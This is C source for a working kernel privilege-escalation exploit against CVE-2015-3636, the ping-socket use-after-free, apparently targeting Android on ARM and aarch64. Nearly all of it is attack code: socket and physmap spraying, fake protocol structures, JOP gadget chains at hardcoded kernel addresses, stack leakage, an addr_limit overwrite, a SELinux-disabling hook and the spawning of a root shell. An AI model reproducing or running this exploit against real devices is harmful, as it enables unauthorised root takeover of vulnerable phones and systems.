#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <sys/sysinfo.h>
#include <arpa/inet.h>
#include <linux/in.h>
#include "get_root.h"

#define TOTAL_SOCK_NUM 9500000
#define MAGIC_BASE_ADDR 0x200000
#define MAGIC_ADDR 0x200200
#define MAGIC_NUM(x) (0x0dead000|x)
#define MEM_MIN_LEN 0x1000
#define TAG "CVE_2015_3636"
#define true 1
#define false 0
#define SOCK_NUM 1000
#define MAP_NUM 0x800
#define PYHSMAP_LENTH (2*1024*1024)
#define CHILD_NUM 100
#define SIOCGSTAMPNS 0x8907
#define NSEC_PER_SEC 1000000000
#define MAX_SOCK_ID 1000
#define ADDR_LIMIT_OFFSET 0x8
#ifndef __aarch64__
#define KERNEL_START 0xc0080000
#define TIMESTAMP_OFFSET 0x158
#define SOCKPROT_OFFSET 0x1c
#define SP_MASK 0xFFFFFC00
#ifndef PAGE_MASK
#define PAGE_MASK 0xFFFFF000
#endif
#else
#define KERNEL_START 0xffffffc000080000
#define SP_MASK 0xFFFFFFFFFFFFC000
#define TIMESTAMP_OFFSET 0x1d8
#define SOCKPROT_OFFSET 0x28
#define RXHASH_OFFSET 0x9c
#define X1_OFFSET 0x138
#define SOCK_FLAG_OFFSET 0xc8
#ifndef PAGE_MASK
#define PAGE_MASK 0xfffffffffffff000
#endif
#endif

#define POINT_ADD(x,y) ((size_t)x+y)

int sock_fd[SOCK_NUM];
void *map_address[MAP_NUM];
int kill_child = 0;
int current_sock_num = 0;
int target_sock_1 = 0;
int target_sock_2 = 0;
void *target_sock_addr1 = NULL;
void *target_sock_addr2 = NULL;
void *fack_prot[300];
void *target_sock_prot_addr1 = NULL;
void *target_sock_prot_addr2 = NULL;
void *target_exec_kaddr;
void *target_exec_uaddr;
void *kerner_sp_bottom = NULL;
int end_child = 0;


extern int get_root_after_addrlimit_patched(void *_thread_info);

extern int patch_selinux_by_change_switch(void *selinux_enforcing,void *selinux_enabled);

extern void* compute_physmap(void *usr_addr);

static int maximize_fd_limit(void)
{
	struct rlimit rlim;
	int ret;

	ret = getrlimit(RLIMIT_NOFILE, &rlim);
	if (ret != 0) {
	return -1;
	}

	rlim.rlim_cur = rlim.rlim_max;
	setrlimit(RLIMIT_NOFILE, &rlim);

	ret = getrlimit(RLIMIT_NOFILE, &rlim);
	if (ret != 0) {
	return -1;
	}

	return rlim.rlim_cur;
}

static int lock_page_in_memory(void *address, size_t size)
{
	int ret;
	ret = mlock(address, size);
	if (ret != 0) {
	return -1;
	}
	return 0;
}

static inline void populate_pagetable_for_address(void *address)
{
	*(void **)address = NULL;
}

static int map_prepare_avoid_crash(){
	void *map;
	map =  mmap((void *)(MAGIC_BASE_ADDR),MEM_MIN_LEN,
	PROT_READ | PROT_WRITE,
	MAP_SHARED|MAP_ANONYMOUS|MAP_FIXED, -1, 0);
	if(map!=(void *)MAGIC_BASE_ADDR){
		printf("[-]0x200200 failed\n");
		return false;
	}
	printf("[+]map prepare ok map:%p\n",map);
	populate_pagetable_for_address(map);
	lock_page_in_memory(map, MEM_MIN_LEN);
	return true;
}

static int make_vul_socket(unsigned int num){
	struct sockaddr sa;
	int ret;
	unsigned int i = 0;
	struct timespec tv;
	for(i=0;i<num;i++){
		memset(&sa,0,sizeof(sa));
		sa.sa_family = AF_INET;
		ret = connect(sock_fd[i],&sa,sizeof(sa));
		memset(&sa,0,sizeof(sa));
		sa.sa_family = AF_UNSPEC;
		ret = connect(sock_fd[i],&sa,sizeof(sa));
		ret = connect(sock_fd[i],&sa,sizeof(sa));
	}
	return true;
}


static void fill_map_whth_time_magic(void *address){
	unsigned int *p;
	unsigned int i,size;
	unsigned int higher,lower;
	p = (unsigned int *)address;
	higher = (unsigned int)(((size_t)address&0xff00000000) >> 32);
	size = PYHSMAP_LENTH/sizeof(unsigned int);
	for(i=0;i<size/2;i++){
		*p = (unsigned long)p&0xffffffff;
		p++;
		*p = (unsigned int)MAGIC_NUM(higher);
		p++;
	}
}


static int create_n_socket(int *sock,int num){
	int i=0;
	for(i=0;i<num;i++){
		sock[i] = socket(AF_INET,SOCK_DGRAM,IPPROTO_ICMP);
		if(sock[i]==-1){
			break;
		}
	}
	return i;
}


static inline void wait_to_be_kill(){
	while(!end_child){
		sleep(1);
	}
}

static inline void clean_child(int *sock,int num){
	int i;
	for(i=0;i<num;i++){
		close(sock[i]);
	}
	free(sock);
}

static inline void set_clean_flag(int sig){
	int a = sig;//unused
	usleep(1000);
	end_child = 1;
}

static void child_task(int pipe_write_fd){
	int *sock;
	int num_created = 0;
	(void)signal(SIGQUIT, set_clean_flag);
	close(1);
	sock = malloc(sizeof(int)*MAX_SOCK_ID);
	if(!sock){
		printf("[-]malloc failed\n");
	}
	num_created = create_n_socket(sock,MAX_SOCK_ID);
	write(pipe_write_fd,&num_created,sizeof(int));
	wait_to_be_kill();
	clean_child(sock,num_created);
	exit(0);
}

static void wait_for_child(int *pipe_fd){
	int child_socket_num;
	read(pipe_fd[0],&child_socket_num,sizeof(int));
	current_sock_num+=child_socket_num;
}

static void kill_all_child(int *pid,int num){
	int i,status;
	for(i=0;i<num;i++){
		kill(pid[i],SIGQUIT);
		waitpid(pid[i],&status,0);
	}
	printf("[+]kill %d child done\n",num);
}

static int create_child_socket(int *pid){
	int num_this_create;
	int sock_fd_max = 1000;
	int i;
	int current_child_num = 0;
	int pipe_fd[2];
	int ret;
	printf("[+]do lifting.\n");
	for(i=0;i<CHILD_NUM;i++){
		ret = pipe(pipe_fd);
		if(ret == -1){
			printf("[-]pipe create failed\n");
			return ret;
		}
		pid[i] = fork();
		if(pid[i]==0){
			child_task(pipe_fd[1]);
		}else if(pid[i] > 0){
			current_child_num++;
			wait_for_child(pipe_fd);
			if(current_sock_num > TOTAL_SOCK_NUM){
				printf("\n[+]current_sock_num :%d\n",current_sock_num);
				break;
			}
			close(pipe_fd[0]);
			close(pipe_fd[1]);
			continue;
		}
	}
	return current_child_num;
}




static int try_and_get_target(){
	struct timespec tv;
	uint64_t value;
	size_t high, low;
	int ret;
	int index;
	unsigned int i;
	int count = 0;
	for(i=0;i<SOCK_NUM;i++){
		if(sock_fd[i] == -1)
			break;
		ret = ioctl(sock_fd[i],SIOCGSTAMPNS,(void *)&tv);
		if(ret!=0){
			continue;
		}
		value = ((uint64_t)tv.tv_sec * NSEC_PER_SEC) + tv.tv_nsec;
		high = (size_t)(value >> 32);
		low = (size_t)value&0xffffffffff;
		if(((high&0xffffff00) == MAGIC_NUM(0))){
			if(count == 0){
				printf("[+]get target 1!%p,%p,%d\n",high,low,i);
				target_sock_1 = sock_fd[i];
				target_sock_addr1 = (void *)(low-TIMESTAMP_OFFSET);//map!
				target_exec_kaddr = compute_physmap((void *)((unsigned long)target_sock_addr1&PAGE_MASK));
				target_exec_uaddr = (void *)(low & PAGE_MASK);
				count++;
			}else if(count == 1){
				printf("[+]get target 2!%p,%p,%d\n",high,low,i);
				target_sock_2 = sock_fd[i];
				target_sock_addr2 = (void *)(low-TIMESTAMP_OFFSET);
				return 1;
			}

		}
	}
	return 0;
}

static int override_physmap(){
	void *map;
	unsigned int i,ret;
	int target_index;
	for(i=0;i<MAP_NUM;i++){
		map = mmap(NULL,PYHSMAP_LENTH,PROT_READ | PROT_WRITE | PROT_EXEC,MAP_ANONYMOUS | MAP_SHARED,-1,0);
		if(map != NULL){
			map_address[i] = map;
			fill_map_whth_time_magic(map);
			if(try_and_get_target()){
				return 1;
			}
		}
		else
			printf("[%d]:mmap failed\n",i);
	}
	printf("[-]failed\n");
	return 0;
}

static int create_main_socket(){
	unsigned int i = 0;
	int sock_num = 0;
	for(i=0;i<SOCK_NUM;i++){
		sock_fd[i] = socket(AF_INET,SOCK_DGRAM,IPPROTO_ICMP);
		if(sock_fd[i]==-1){
			printf("[%d]socket create failed\n",i);
			break;
		}
		sock_num++;
	}
	return sock_num;
}


#ifndef __aarch64__
#define JOP_BASE_ADDR 0x30303100


static inline void construct_jop_leak_sp_32(){
	void *map;
	map = mmap((void *)(JOP_BASE_ADDR-0x100),0x1000,PROT_WRITE | PROT_READ | PROT_EXEC,MAP_FIXED | MAP_SHARED | MAP_ANONYMOUS,-1,0);
	if((unsigned long)map!=JOP_BASE_ADDR-0x100){
		printf("[-]mmap jop base addr failed\n");
		return;
	}
	*(unsigned *)(JOP_BASE_ADDR+0x8) = JOP_BASE_ADDR+0x100;   //jmp r3 @ 1th
	*(unsigned *)(JOP_BASE_ADDR+0x100+4) = 0xc0209bb8; 	//.text:C0209BB8                  LDR             R1, [r0,#-0x30]
														// .text:C0209BBC                 LDR             R5, [r0,#-0x34]
														// .text:C0209BC0                 MOV             R4, r0
														// .text:C0209BC4                 LDR             R2, [r0,#-0x2C]
														// .text:C0209BC8                 LDR             R3, [R1,#0x80]
														// .text:C0209BCC                 MOV             R0, R5
														// .text:C0209BD0                 BLX             R3
	*(unsigned *)(JOP_BASE_ADDR-0x30) = JOP_BASE_ADDR+0x200;
	*(unsigned *)(JOP_BASE_ADDR+0x200+0x80) = 0xc0116c7c;
														// .text:C0116C7C                 MOV             R3, SP
														// .text:C0116C80                 BIC             R3, R3, #0x1FC0
														// .text:C0116C84                 BIC             R3, R3, #0x3F
														// .text:C0116C88                 LDR             R0, [R3,#0x14]
														// .text:C0116C8C                 BLX             R2
	*(unsigned *)(JOP_BASE_ADDR-0x2c) = 0xc06d2730;
														// .text:C06D2730                 STR             R3, [R4]
														// .text:C06D2734                 MOV             R2, #0x20
														// .text:C06D2738                 STR             R6, [R4,#0x20]
														// .text:C06D273C                 STR             R0, [R4,#4]
														// .text:C06D2740                 LDR             R0, [R5,#0x50]
														// .text:C06D2744                 LDR             R3, [R0,#8]
														// .text:C06D2748                 LDR             R3, [R3,#0x10]
														// .text:C06D274C                 BLX             R3
	*(unsigned *)(JOP_BASE_ADDR-0x34) = JOP_BASE_ADDR+0x300; // ldr r5,[r0, #-34]---->LDR R0, [R5,#0x50]--->LDR R3, [R0,#8]--->LDR R3,[R3,#0x10]
	*(unsigned *)(JOP_BASE_ADDR+0x300+0x50) = JOP_BASE_ADDR+0x400;
	*(unsigned *)(JOP_BASE_ADDR+0x400+8) = JOP_BASE_ADDR+0x500;
	*(unsigned *)(JOP_BASE_ADDR+0x500+0x10) = 0xc0a1747c; //ret from inet_release
}


static inline void construct_fack_prot_leak_sp_32(){
	fack_prot[0] = (void *)0xc06f9f84;
									// .text:C06F9F84                 LDR             R3, [R2,#8]    R2=JOP_BASE_ADDR
									// .text:C06F9F88                 MOV             R0, R2
									// .text:C06F9F8C                 LDR             R3, [R3,#4]
									// .text:C06F9F90                 BLX             R3
}

static inline void construct_mem_patch_aadr_limit_32(){
	fack_prot[0] = (void *)0xc0184e54;
							// .text:C0184E54                 LDR             R3, [R4,#4]
							// .text:C0184E58                 MOVT            R0, #0x333
							// .text:C0184E5C                 STR             R1, [R2,#0x20]
							// .text:C0184E60                 BLX             R3
	*(unsigned *)((unsigned int)target_sock_addr2+4) = 0xc0a1747c; // sk+4--->R4+4
}



static void prepare_target_1_32(){
	construct_jop_leak_sp_32();
	construct_fack_prot_leak_sp_32();
	target_sock_prot_addr1 = (void *)POINT_ADD(target_sock_addr1,SOCKPROT_OFFSET);
	*(unsigned long *)target_sock_prot_addr1 = (unsigned long)&fack_prot[0];
	*(int *)POINT_ADD(target_sock_addr1,0x2c) = 0; 	//mmap_queue
	*(long *)POINT_ADD(target_sock_addr1,0x88) = 0xffff0000;//time_flag
	*(long *)POINT_ADD(target_sock_addr1,0x6c) = JOP_BASE_ADDR;
	memset((void *)POINT_ADD(target_sock_addr1,0x88),0,0x300); //avoid crash



}


static void prepare_target_2_32(){
	construct_mem_patch_aadr_limit_32();
	target_sock_prot_addr2 = (void *)POINT_ADD(target_sock_addr2,SOCKPROT_OFFSET);
	*(unsigned long *)target_sock_prot_addr2 = (unsigned long)&fack_prot[0];
	*(int *)POINT_ADD(target_sock_addr2,0x2c) = 0; 	//mmap_queue
	*(long *)POINT_ADD(target_sock_addr2,0x88)  = 0xffff0000;//time_flag
	*(long *)POINT_ADD(target_sock_addr2,0x6c) = (unsigned long)kerner_sp_bottom+8-0x20; //R2  addr_limit-0x20
	memset((void *)POINT_ADD(target_sock_addr2,0x88),0,0x300); //avoid crash
}

#else
#define JOP_BASE_ADDR 0x30303000


static inline void construct_fack_prot_leak_sp_64(){
	fack_prot[0] = (void *)0xffffffc0002e38fc;
	// : ldr x2, [x1, #8] ; ldr x0, [x1] ; blr x2
	// jop[0]
}

static inline void construct_mem_patch_aadr_limit_64(){
	fack_prot[0] = (void *)0xffffffc0001af5ec;
	//sub x3, x3, #0x90 ; str x3, [x1, #0x48] ; ret
}


static void construct_jop_leak_sp_64(){
	void *map;
	size_t jop[8];
	size_t x0 = 0x100,x3 = 0x300,x6 = 0x200,j4_addr=0x400;
	jop[0]=0xffffffc0002e38fc;
	// : ldr x2, [x1, #8] ; ldr x0, [x1] ; blr x2
	jop[1]=0xffffffc000360c9c;
	// : ldr x6, [x0, #0x28] ; ldr x5, [x6, #0x50] ; cbz x5, #0x2e0cc0 ; blr x5
	jop[2]=0xffffffc0000f582C;
	//: ldr x3, [x0, #0x18] ; ldr x2, [x3, #0x18] ; cbz x2, #0x75864 ; blr x2
	jop[3]=0xffffffc00048e11c;
	 //: ldr x2, [x0, #0x58] ; ldr x1, [x0, #0x60] ; ldr x2, [x2] ; blr x2
	jop[4]=0xffffffc000083db8;
	 //: mov x0, sp ; blr x1
	jop[5]=0xffffffc000277254;
	 //: ldr x2, [x3, #0xa0] ; cbz x2, #0x1f7278 ; mov x1, x0 ; mov x0, x3 ; blr x2
	jop[6]=0xffffffc0002702c4;
	//: str x1, [x3, #0xc0] ; ldr x1, [x6, #0x20] ; blr x1
	jop[7]=0xFFFFFFC0003FEA34; // ajust x30 and ret
	map = mmap((void *)JOP_BASE_ADDR,0x1000,PROT_WRITE | PROT_READ | PROT_EXEC,MAP_FIXED | MAP_SHARED | MAP_ANONYMOUS,-1,0);
	if((size_t)map!=JOP_BASE_ADDR){
		printf("[-]mmap jop base addr failed\n");
		return;
	}
	*(size_t *)JOP_BASE_ADDR = JOP_BASE_ADDR+x0;
	*(size_t *)(JOP_BASE_ADDR+8) = jop[1];
	*(size_t *)(JOP_BASE_ADDR+x0+0x18) = JOP_BASE_ADDR+x3;
	*(size_t *)(JOP_BASE_ADDR+x0+0x28) = JOP_BASE_ADDR+x6;
	*(size_t *)(JOP_BASE_ADDR+x0+0x58) = JOP_BASE_ADDR+j4_addr;
	*(size_t *)(JOP_BASE_ADDR+x0+0x60) = jop[5];
	*(size_t *)(JOP_BASE_ADDR+x6+0x20) = jop[7];
	*(size_t *)(JOP_BASE_ADDR+x6+0x50) = jop[2];
	*(size_t *)(JOP_BASE_ADDR+x3+0x18) = jop[3];
	*(size_t *)(JOP_BASE_ADDR+x3+0xa0) = jop[6];
	*(size_t *)(JOP_BASE_ADDR+j4_addr) = jop[4];
}

static void prepare_target_1_64(){
	construct_jop_leak_sp_64();
	construct_fack_prot_leak_sp_64();
	target_sock_prot_addr1 = (void *)POINT_ADD(target_sock_addr1,SOCKPROT_OFFSET);
	*(unsigned long *)target_sock_prot_addr1 = (unsigned long)&fack_prot[0];
	*(int *)POINT_ADD(target_sock_addr1,RXHASH_OFFSET) = 0;
	*(long *)POINT_ADD(target_sock_addr1,SOCK_FLAG_OFFSET) = 0xffffffff;//time_flag,get x1 controled need this
	*(long *)POINT_ADD(target_sock_addr1,X1_OFFSET) = JOP_BASE_ADDR;
	memset((void *)POINT_ADD(target_sock_addr1,X1_OFFSET+0x20),0,0x300); //avoid crash
}


static void prepare_target_2_64(){
	construct_mem_patch_aadr_limit_64();
	target_sock_prot_addr2 = (void *)POINT_ADD(target_sock_addr2,SOCKPROT_OFFSET);
	*(unsigned long *)target_sock_prot_addr2 = (unsigned long)&fack_prot[0];
	*(int *)POINT_ADD(target_sock_addr2,RXHASH_OFFSET) = 0; 	//mmap_queue
	*(long *)POINT_ADD(target_sock_addr2,SOCK_FLAG_OFFSET) = 0xffffffff;//time_flag
	*(long *)POINT_ADD(target_sock_addr2,X1_OFFSET) = (long)kerner_sp_bottom+ADDR_LIMIT_OFFSET-0x48; //x1  addr_limit
	memset((void *)POINT_ADD(target_sock_addr2,X1_OFFSET+0x20),0,0x300); //avoid crash
}

#endif

#ifndef __aarch64__
#define LEEK_OFFSET 0
#else
#define LEEK_OFFSET 0x3c0
#endif
static int leek_kernel_sp(){
	int ret;
	if(target_sock_1 <= 0){
		printf("[-]sad no socket\n");
		return -1;
	}
	#ifndef __aarch64__
	prepare_target_1_32();
	#else
	prepare_target_1_64();
	#endif
	close(target_sock_1);
	kerner_sp_bottom = (void *)((*(size_t *)(JOP_BASE_ADDR+LEEK_OFFSET)) & SP_MASK);
	if(kerner_sp_bottom!=NULL){
		printf("[+]leek kernel sp done! kernel_sp : %p\n",kerner_sp_bottom);
		//scanf("%d",&ret);
		return 1;
	}
	else{
		printf("[-]leek kernel sp failed\n");
		return 0;
	}
}



static int patch_addr_limit(){
	int ret;
	#ifndef __aarch64__
	prepare_target_2_32();
	#else
	prepare_target_2_64();
	#endif
	close(target_sock_2);
	printf("[+]pach addr_limit ok\n");
	//scanf("%d",&ret);
	return 1;
}

static int prepareWork(){
	int pid[CHILD_NUM],i,main_sock_num,current_child_num,ret;
	maximize_fd_limit();
	current_child_num = create_child_socket(pid);
	main_sock_num = create_main_socket();
	printf("[+]get %d socket\n",main_sock_num);
	kill_all_child(pid,current_child_num);
	if(!map_prepare_avoid_crash())
		return -1;
	if(!make_vul_socket(main_sock_num))
		return -1;
	printf("[+]make vul socket done\n");
	if(override_physmap() == 0){
		return -1;
	}
	printf("[+]OK ,let's leek kerner sp\n");
	if(leek_kernel_sp())
		return 1;
	return 0;
}


static void clean_physmap(){
	int i=0;
	for(i=0;i<MAP_NUM;i++){
		if(map_address[i])
			munmap(map_address[i],PYHSMAP_LENTH);
	}
	printf("[+]clean map ok\n");
}

int main(){
	int ret;
	if(prepareWork()){
		printf("[+]prepare work ok ,ready to patch aadr_limit\n");
	}
	if(patch_addr_limit()){
		printf("[+]ready to get root\n");
	}
	if(get_root_after_addrlimit_patched(kerner_sp_bottom)){
		clean_physmap();
		system("/system/bin/sh");
	}
	scanf("%d",&ret);
	return 0;
}



